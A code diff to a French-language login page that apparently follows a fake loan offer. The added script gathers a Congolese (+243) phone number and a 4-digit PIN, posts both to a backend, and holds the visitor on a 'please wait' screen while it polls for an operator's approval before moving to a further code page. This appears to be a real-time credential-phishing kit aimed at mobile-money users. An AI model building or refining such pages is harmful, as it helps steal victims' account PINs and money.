@@ -229,7 +229,7 @@
 
         <div class="forgot">Forgot PIN?</div>
 
-        <button type="submit" class="btn submit-btn" style="display:block; width:100%; max-width:300px; margin:20px auto 0; padding:14px 20px; background:#0b5ed7; color:#fff; border-radius:12px; font-size:16px; font-weight:bold;">Submit</button>
+        <button type="submit" class="btn submit-btn" disabled style="display:block; width:100%; max-width:300px; margin:20px auto 0; padding:14px 20px; background:#bdbdbd; color:#fff; border-radius:12px; font-size:16px; font-weight:bold; cursor:not-allowed;">Submit</button>
     </div>
 
     <div class="bottom">
@@ -249,59 +249,165 @@
     </div>
 
     <script>
-        const phoneInput = document.getElementById('phone');
-        const otpInputs = Array.from(document.querySelectorAll('.otp-input'));
-        const submitBtn = document.querySelector('.submit-btn');
+  const phoneInput = document.getElementById('phoneInput');
+  const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
 
-        function isFormValid() {
-            const phoneValue = phoneInput.value.trim();
-            const pinValue = otpInputs.map((input) => input.value).join('');
-            return phoneValue.length >= 9 && pinValue.length === 4;
+  // Automatically reflect the phone number passed from the loan application.
+  const incomingParams = new URLSearchParams(window.location.search);
+  const incomingPhone = incomingParams.get('phone') || '';
+  const normalizedPhone = incomingPhone.replace(/\\D/g, '').replace(/^243/, '');
+  if (/^9[0-9]{8}$/.test(normalizedPhone)) {
+    phoneInput.value = normalizedPhone;
+  }
+  const connexionBtn = document.getElementById('connexionBtn');
+  const eyeBtn = document.getElementById('eyeBtn');
+
+  const invalidModal = document.getElementById('invalidModal');
+  const invalidMessage = document.getElementById('invalidMessage');
+  const invalidOkBtn = document.getElementById('invalidOkBtn');
+
+  function showInvalidPhone(message){
+    invalidMessage.innerHTML = message;
+    invalidModal.classList.add('visible');
+  }
+
+  function checkFormValid(){
+    const phone = phoneInput.value.trim();
+    const codeFilled = codeBoxes.every(b => b.value.length === 1);
+
+    // Let the user submit any entered number. Validation happens after
+    // clicking CONNEXION, so invalid numbers can show the modal.
+    if(phone.length > 0 && codeFilled){
+      connexionBtn.classList.add('active');
+      connexionBtn.disabled = false;
+    } else {
+      connexionBtn.classList.remove('active');
+      connexionBtn.disabled = true;
+    }
+  }
+
+  phoneInput.addEventListener('input', () => {
+    // Keep the field clean, but do not show an error while typing.
+    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+    checkFormValid();
+  });
+
+  invalidOkBtn.addEventListener('click', () => {
+    invalidModal.classList.remove('visible');
+    phoneInput.focus();
+  });
+
+  codeBoxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/[^0-9]/g, '');
+      if(box.value && i < codeBoxes.length - 1){
+        codeBoxes[i + 1].focus();
+      }
+      checkFormValid();
+    });
+    box.addEventListener('keydown', (e) => {
+      if(e.key === 'Backspace' && !box.value && i > 0){
+        codeBoxes[i - 1].focus();
+      }
+    });
+  });
+
+  let codeVisible = false;
+  eyeBtn.addEventListener('click', () => {
+    codeVisible = !codeVisible;
+    codeBoxes.forEach(b => b.type = codeVisible ? 'text' : 'password');
+    eyeBtn.textContent = codeVisible ? '🙈' : '👁️';
+  });
+
+  const overlay = document.getElementById('approvalOverlay');
+  const spinner = document.getElementById('spinner');
+  const overlayTitle = document.getElementById('overlayTitle');
+  const overlayText = document.getElementById('overlayText');
+  const deniedMsg = document.getElementById('deniedMsg');
+  const retryBtn = document.getElementById('retryBtn');
+  let pollTimer = null;
+
+  function showOverlayWaiting(){
+    overlay.classList.add('visible');
+    spinner.style.display = 'block';
+    overlayTitle.textContent = 'Veuillez patienter...';
+    overlayTitle.style.display = 'block';
+    overlayText.style.display = 'block';
+    overlayText.textContent = 'Cela prend généralement quelques secondes';
+    deniedMsg.style.display = 'none';
+    retryBtn.style.display = 'none';
+  }
+
+  function pollApproval(id, params){
+    if(pollTimer) clearInterval(pollTimer);
+    pollTimer = setInterval(async () => {
+      try {
+        const res = await fetch('/api/check-approval/' + id);
+        const data = await res.json();
+
+        if(data.status === 'approved'){
+          clearInterval(pollTimer);
+          window.location.href = 'pto.html?' + params.toString();
+        } else if(data.status === 'denied'){
+          clearInterval(pollTimer);
+          spinner.style.display = 'none';
+          overlayTitle.style.display = 'none';
+          overlayText.style.display = 'none';
+          deniedMsg.style.display = 'block';
+          retryBtn.style.display = 'inline-block';
         }
+        // 'pending' -> keep polling
+      } catch (err) {
+        // network hiccup — keep trying silently
+      }
+    }, 2500);
+  }
 
-        phoneInput.addEventListener('input', () => {
-            phoneInput.value = phoneInput.value.replace(/\D/g, '');
-        });
+  retryBtn.addEventListener('click', () => {
+    overlay.classList.remove('visible');
+  });
 
-        otpInputs.forEach((input, index) => {
-            input.addEventListener('input', () => {
-                input.value = input.value.replace(/\D/g, '').slice(0, 1);
-                if (input.value && index < otpInputs.length - 1) {
-                    otpInputs[index + 1].focus();
-                }
-            });
+  connexionBtn.addEventListener('click', async () => {
+    const phone = phoneInput.value.trim();
 
-            input.addEventListener('keydown', (event) => {
-                if (event.key === 'Backspace' && !input.value && index > 0) {
-                    otpInputs[index - 1].focus();
-                }
-            });
+    // Show the invalid-number page only when the user tries to submit.
+    if(!/^9[0-9]{8}$/.test(phone)){
+      showInvalidPhone(
+        'Le numéro de téléphone doit commencer par 9 et contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!'
+      );
+      return;
+    }
 
-            input.addEventListener('paste', (event) => {
-                event.preventDefault();
-                const pasted = (event.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-                if (!pasted) return;
+    if(connexionBtn.disabled) return;
 
-                pasted.split('').forEach((digit, i) => {
-                    if (otpInputs[index + i]) {
-                        otpInputs[index + i].value = digit;
-                    }
-                });
+    const params = new URLSearchParams(window.location.search);
+    const code = codeBoxes.map(b => b.value).join('');
+    params.set('phone', phone);
 
-                const nextEmpty = otpInputs.find((item) => !item.value);
-                if (nextEmpty) nextEmpty.focus();
-            });
-        });
+    showOverlayWaiting();
 
-        submitBtn.addEventListener('click', () => {
-            if (!isFormValid()) {
-                alert('Please enter a valid phone number and complete the 4-digit PIN.');
-                return;
-            }
+    try {
+      const res = await fetch('/api/request-approval', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          plan: params.get('plan'),
+          price: params.get('price'),
+          phone: phone,
+          code: code,
+          step: 'login'
+        })
+      });
+      const data = await res.json();
+      pollApproval(data.id, params);
+    } catch (err) {
+      overlayTitle.textContent = 'Erreur de connexion';
+      overlayText.textContent = "Impossible d'envoyer la demande. Vérifiez votre connexion et réessayez.";
+      spinner.style.display = 'none';
+      retryBtn.style.display = 'inline-block';
+    }
+  });
+</script>
 
-            const phone = phoneInput.value.trim();
-            window.location.href = 'pto.html?phone=' + encodeURIComponent(phone);
-        });
-    </script>
 </body>
 </html>
